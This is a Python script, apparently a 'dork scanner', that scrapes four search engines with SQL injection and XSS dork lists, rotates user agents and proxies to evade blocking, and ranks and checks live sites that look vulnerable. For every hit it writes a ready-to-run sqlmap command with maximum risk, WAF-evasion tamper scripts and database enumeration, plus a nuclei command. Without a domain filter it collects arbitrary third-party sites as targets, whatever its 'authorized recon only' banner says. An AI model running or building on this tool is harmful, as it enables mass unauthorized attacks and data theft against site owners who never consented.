#!/usr/bin/env python3
"""
MultiEngineDorkFramework v5.1 - Ethical OSINT Dork Scanner (Dec 19, 2025)
WARNING: Authorized recon only. Respect ToS/rate limits/robots.txt.
No API keys required – pure HTML scraping only.
"""

import argparse
import asyncio
import json
import logging
import random
import re
import time
import urllib.parse
from dataclasses import asdict, dataclass, field
from functools import lru_cache, wraps
from typing import Dict, List, Optional, Set

import aiohttp
from bs4 import BeautifulSoup
from tqdm.asyncio import tqdm

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)


@dataclass
class SearchResult:
    url: str
    title: str
    snippet: str
    engine: str
    score: int = field(default=0)
    sqlmap_cli: str = field(default="")
    nuclei_cli: str = field(default="")


class MultiEngineDorkFramework:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    ]

    def __init__(
        self,
        proxies: Optional[List[str]] = None,
        output_format: str = "json",
        cache_file: str = "dork_cache.json",
    ):
        self.proxies = proxies or []
        self.output_format = output_format
        self.session: Optional[aiohttp.ClientSession] = None
        self.cache_file = cache_file
        self.cache: Dict[str, List[SearchResult]] = self._load_cache()
        self.engines = {
            "google": {
                "base_url": "https://www.google.com/search?q=",
                "result_selector": 'div.g a[href^="http"]',
                "title_selector": "h3",
                "snippet_selector": ".VwiC3b",
                "rate_limit": 2.0,
                "pagination_param": "&start=",
            },
            "bing": {
                "base_url": "https://www.bing.com/search?q=",
                "result_selector": 'li.b_algo h2 a[href^="http"]',
                "title_selector": "h2",
                "snippet_selector": ".b_caption p",
                "rate_limit": 1.5,
                "pagination_param": "&first=",
            },
            "duckduckgo": {
                "base_url": "https://html.duckduckgo.com/html/?q=",
                "result_selector": '.result__a[href^="http"]',
                "title_selector": ".result__title",
                "snippet_selector": ".result__snippet",
                "rate_limit": 1.0,
                "pagination_param": "&s=",
            },
            "yandex": {
                "base_url": "https://yandex.com/search/?text=",
                "result_selector": '.OrganicResults a[href^="http"]',
                "title_selector": ".organic__title",
                "snippet_selector": ".organic__text",
                "rate_limit": 1.2,
                "pagination_param": "&p=",
            },
        }

    def _load_cache(self) -> Dict[str, List[SearchResult]]:
        try:
            with open(self.cache_file, "r") as f:
                data = json.load(f)
                return {eng: [SearchResult(**r) for r in eng_results] for eng, eng_results in data.items()}
        except FileNotFoundError:
            return {}

    def _save_cache(self) -> None:
        with open(self.cache_file, "w") as f:
            json.dump({eng: [asdict(r) for r in results] for eng, results in self.cache.items()}, f, indent=2)

    async def _get_session(self) -> aiohttp.ClientSession:
        if self.session is None:
            connector = aiohttp.TCPConnector(limit=40, limit_per_host=20, ttl_dns_cache=300)
            self.session = aiohttp.ClientSession(
                connector=connector, headers={"User-Agent": self._get_random_ua()}
            )
        return self.session

    def _get_random_ua(self) -> str:
        return random.choice(self.USER_AGENTS)

    @lru_cache(maxsize=10000)
    def _normalize_url(self, url: str) -> str:
        parsed = urllib.parse.urlparse(url.lower())
        return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path.rstrip("/"), "", "", ""))

    def _score_dork_result(self, result: SearchResult) -> int:
        score = 0
        low_snip = result.snippet.lower()
        if any(
            err in low_snip
            for err in [
                "sql syntax",
                "mysql_fetch",
                "ora-",
                "incorrect syntax",
                "<script>",
                "alert(",
                "onerror=",
                "onload=",
            ]
        ):
            score += 3
        if any(param in result.url.lower() for param in ["id=", "cat=", "page=", "?q=", "search=", "query="]):
            score += 2
        if "api" in result.url.lower() or "graphql" in result.url.lower():
            score += 1
        return score

    def _generate_sqlmap_cli(self, url: str) -> str:
        params = re.findall(r"(id|cat|q|user|product|category|item|article|news|search|query)=([^&\s]+)", url, re.I)
        if params:
            return (
                f'sqlmap -u "{url}" --dbs --risk=3 --level=5 --random-agent '
                f"--tamper=space2comment,charencode,between,versionedkeywords,randomcase,equaltolike "
                f"--batch --threads=5"
            )
        return "N/A (no injectable param detected)"

    def _generate_nuclei_cli(self, url: str) -> str:
        return f'nuclei -u "{url}" -t sql-injection/,xss/ --severity high,critical -rl 100 -batch'

    def generate_master_dork_list(self) -> Dict[str, List[str]]:
        master_dorks = {
            "CRITICAL_SQLI_PARAMS": [
                "inurl:.php?id=",
                "inurl:.php?cat=",
                "inurl:.php?page=",
                "inurl:.php?product=",
                "inurl:.php?category=",
                "inurl:.php?item=",
                "inurl:.php?article=",
                "inurl:.php?news=",
                "inurl:.asp?id=",
                "inurl:.aspx?id=",
                "inurl:.asp?category=",
                "inurl:.aspx?product=",
                "inurl:.asp?page=",
                "inurl:.jsp?id=",
                "inurl:.jsp?product=",
                "inurl:.jsp?category=",
                "inurl:.cgi?id=",
                "inurl:.pl?id=",
            ],
            "ADVANCED_PATTERNS": [
                "inurl:.php?id=1&page=2",
                "inurl:.asp?id=1&category=2",
                "inurl:.aspx?id=1&product=2",
                "inurl:.php?productid=1&categoryid=2",
                "inurl:.php?user=",
                "inurl:.asp?userid=",
                "inurl:.aspx?userid=",
                "inurl:.php?session=",
                "inurl:.php?search=",
                "inurl:.asp?query=",
                "inurl:.aspx?keyword=",
            ],
            "ERROR_BASED_DETECTION": [
                'inurl:.php?id= "mysql_fetch_array"',
                'inurl:.php?id= "mysql_num_rows"',
                'inurl:.php?id= "mysql_result"',
                'inurl:.php?id= "mysql_free_result"',
                'inurl:.asp?id= "microsoft ole db provider"',
                'inurl:.aspx?id= "system.data.sqlclient.sqlexception"',
                'inurl:.php?id= "you have an error in your sql syntax"',
                'inurl:.asp?id= "unclosed quotation mark"',
                'inurl:.aspx?id= "incorrect syntax near"',
            ],
            "CMS_SPECIFIC": [
                "inurl:/wp-content/plugins/",
                "inurl:/wp-admin/admin-ajax.php?action=",
                "inurl:/wp-json/wp/v2/posts/",
                "inurl:index.php?option=com_content&id=",
                "inurl:index.php?option=com_users&id=",
                "inurl:index.php?option=com_newsfeeds&id=",
                "inurl:/node/?id=",
                "inurl:/taxonomy/term/?id=",
                "inurl:/user/?id=",
            ],
            "E_COMMERCE": [
                "inurl:product.php?id=",
                "inurl:product.asp?id=",
                "inurl:product.aspx?id=",
                "inurl:item.php?id=",
                "inurl:viewitem.php?id=",
                "inurl:catalog.php?id=",
                "inurl:category.php?id=",
                "inurl:shop.php?id=",
            ],
            "API_ENDPOINTS": [
                "inurl:/api/v1/products?id=",
                "inurl:/api/users?user_id=",
                "inurl:/api/search?q=",
                "inurl:/api/graphql?query=",
                "inurl:/rest/api/items?item=",
            ],
            "XSS_REFLECTED": [
                "inurl:.php?search=",
                "inurl:.php?q=",
                "inurl:.php?query=",
                "inurl:.php?keyword=",
                "inurl:.php?name=",
                "inurl:.php?title=",
                "inurl:.php?text=",
                "inurl:.php?message=",
                "inurl:.asp?search=",
                "inurl:.aspx?search=",
                "inurl:.jsp?search=",
                "inurl:search.php?q=",
                "inurl:search.asp?q=",
                "inurl:search.aspx?q=",
            ],
            "XSS_ERROR": [
                'inurl:.php?q= "<script>"',
                'inurl:.php?search= "<script>alert',
                'inurl:.php?name= "<img src=x onerror"',
                'inurl:.php?query= "onerror=alert"',
                'inurl:.asp?q= "<script>"',
                'inurl:.aspx?search= "alert(',
            ],
        }
        return master_dorks

    def _retry_on_failure(max_retries: int = 3):
        def decorator(func):
            @wraps(func)
            async def wrapper(*args, **kwargs):
                for attempt in range(max_retries):
                    try:
                        return await func(*args, **kwargs)
                    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                        if attempt == max_retries - 1:
                            raise
                        wait = (2**attempt) + random.uniform(0, 1)
                        logger.warning(f"Retry {attempt+1}/{max_retries} after {wait}s: {e}")
                        await asyncio.sleep(wait)
            return wrapper

        return decorator

    @_retry_on_failure()
    async def search_engine(
        self, engine_name: str, dork: str, engine_config: Dict, max_results: int = 10, pages: int = 5
    ) -> List[SearchResult]:
        results: List[SearchResult] = []
        session = await self._get_session()

        for page in range(1, pages + 1):
            pag_param = engine_config["pagination_param"]
            offset = 10 * (page - 1)
            url = (
                engine_config["base_url"]
                + urllib.parse.quote(dork)
                + f"{pag_param}{offset}&num={max_results}"
                if "google" in engine_name or "bing" in engine_name
                else engine_config["base_url"] + urllib.parse.quote(dork) + f"{pag_param}{page}"
            )

            proxy = self._get_random_proxy()
            headers = {"User-Agent": self._get_random_ua()}

            try:
                async with session.get(
                    url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=15)
                ) as resp:
                    if resp.status != 200:
                        logger.warning(f"{engine_name} {resp.status} on page {page}")
                        continue

                    html = await resp.text()
                    soup = BeautifulSoup(html, "html.parser")

                    links = soup.select(engine_config["result_selector"])[:max_results]
                    snippets = soup.select(engine_config["snippet_selector"])
                    snippet_count = len(snippets)

                    for i, link_elem in enumerate(links):
                        href = link_elem.get("href", "")
                        if not href or any(block in href for block in [engine_name, "captcha", "policy"]):
                            continue

                        title_elem = link_elem.select_one(engine_config["title_selector"]) or link_elem
                        snippet_elem = snippets[i] if i < snippet_count else None

                        title = title_elem.get_text(strip=True) if title_elem else "N/A"
                        snippet = snippet_elem.get_text(strip=True) if snippet_elem else "N/A"

                        if not snippet:
                            snippet_match = re.search(
                                r'<div[^>]*class="[^"]*snippet[^"]*"[^>]*>(.*?)</div>',
                                html,
                                re.DOTALL | re.I,
                            )
                            snippet = snippet_match.group(1).strip() if snippet_match else "N/A"

                        norm_url = self._normalize_url(href)
                        if norm_url in {r.url for r in self.cache.get(engine_name, [])}:
                            continue
                        result = SearchResult(norm_url, title, snippet, engine_name)
                        result.score = self._score_dork_result(result)
                        result.sqlmap_cli = self._generate_sqlmap_cli(norm_url)
                        result.nuclei_cli = self._generate_nuclei_cli(norm_url)
                        results.append(result)

                await asyncio.sleep(engine_config["rate_limit"] + random.uniform(0, 0.5))
            except Exception as e:  # noqa: BLE001
                logger.error(f"Page {page} failed for {engine_name}: {e}")

        return results

    def _get_random_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        return random.choice(self.proxies)

    async def execute_cross_engine_scan(
        self,
        domain_filter: Optional[str] = None,
        output_file: Optional[str] = None,
        max_results: int = 10,
        pages: int = 5,
    ) -> List[SearchResult]:
        logger.info("🌐 INITIATING MULTI-ENGINE DORK SCAN (SQLi + XSS)")
        logger.info("=" * 60)

        all_targets: Set[str] = set()
        results: List[SearchResult] = []
        master_dorks = self.generate_master_dork_list()

        total_dorks = sum(len(dorks) for dorks in master_dorks.values())
        pbar = tqdm(total=total_dorks * len(self.engines) * pages, desc="Scanning", unit="page")

        tasks = []
        for engine_name, engine_config in self.engines.items():
            logger.info(f"\n🔧 QUEUING {engine_name.upper()} SCAN (pages={pages})")

            for category, dorks in master_dorks.items():
                for dork in dorks:
                    query_dork = dork
                    if domain_filter:
                        query_dork += f" site:{domain_filter}"

                    task = self.search_engine(engine_name, query_dork, engine_config, max_results, pages)
                    tasks.append((task, engine_config["rate_limit"]))

        semaphore = asyncio.Semaphore(40)

        async def bounded_search(task, delay):
            async with semaphore:
                res = await task
                await asyncio.sleep(delay + random.uniform(0, 0.5))
                pbar.update(pages)
                return res

        scan_tasks = [bounded_search(task, delay) for task, delay in tasks]
        scan_results = await asyncio.gather(*scan_tasks, return_exceptions=True)

        for raw_res in scan_results:
            if isinstance(raw_res, Exception):
                logger.error(f"Task failed: {raw_res}")
                continue
            for result in raw_res or []:
                norm_url = self._normalize_url(result.url)
                if norm_url not in all_targets:
                    all_targets.add(norm_url)
                    results.append(result)

        pbar.close()

        logger.info("🔍 Validating top results (batched)...")
        top_results = sorted(results, key=lambda x: x.score, reverse=True)[:50]
        valid_results: List[SearchResult] = []
        session = await self._get_session()
        batches = [top_results[i : i + 20] for i in range(0, len(top_results), 20)]
        for batch in tqdm(batches, desc="Liveness batch"):
            checks = []
            for r in batch:
                async def check_live(r=r):
                    try:
                        async with session.head(
                            r.url, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=5)
                        ) as resp:
                            return 200 <= resp.status < 400
                    except Exception:  # noqa: BLE001
                        return False

                checks.append(check_live())
            live_flags = await asyncio.gather(*checks)
            for r, live in zip(batch, live_flags):
                if live:
                    valid_results.append(r)

        results = valid_results + [r for r in results if r not in top_results]
        logger.info(f"✅ SCAN COMPLETE: {len(results)} unique/valid targets found")

        if output_file:
            await self._export_results(results, output_file)

        self._save_cache()
        if self.session:
            await self.session.close()
        return results

    async def _export_results(self, results: List[SearchResult], filename: str) -> None:
        if self.output_format == "json":
            data = [asdict(r) for r in sorted(results, key=lambda x: x.score, reverse=True)]
            with open(filename, "w") as f:
                json.dump(data, f, indent=2)
        elif self.output_format == "csv":
            import csv

            with open(filename, "w", newline="") as f:
                writer = csv.DictWriter(
                    f, fieldnames=["url", "title", "snippet", "engine", "score", "sqlmap_cli", "nuclei_cli"]
                )
                writer.writeheader()
                writer.writerows([asdict(r) for r in sorted(results, key=lambda x: x.score, reverse=True)])
        logger.info(f"📄 Results exported to {filename}")


async def main():
    parser = argparse.ArgumentParser(description="Multi-Engine Dork Scanner (SQLi + XSS)")
    parser.add_argument("--domain", help="Domain filter (e.g., example.com)")
    parser.add_argument("--output", help="Output file (json/csv)")
    parser.add_argument("--format", choices=["json", "csv"], default="json", help="Output format")
    parser.add_argument("--proxies", nargs="+", help="Proxy list[](http://ip:port)")
    parser.add_argument("--num-results", type=int, default=10, help="Max results per page")
    parser.add_argument("--pages", type=int, default=5, help="Pages to scan per engine")
    args = parser.parse_args()

    framework = MultiEngineDorkFramework(proxies=args.proxies, output_format=args.format)
    results = await framework.execute_cross_engine_scan(
        domain_filter=args.domain, output_file=args.output, max_results=args.num_results, pages=args.pages
    )

    top = sorted(results, key=lambda x: x.score, reverse=True)[:10]
    for r in top:
        print(f"Score: {r.score} | {r.engine}: {r.title[:50]}... ({r.url})")
        print(f"sqlmap: {r.sqlmap_cli}")
        print(f"nuclei: {r.nuclei_cli}")
        print("---")


if __name__ == "__main__":
    asyncio.run(main())
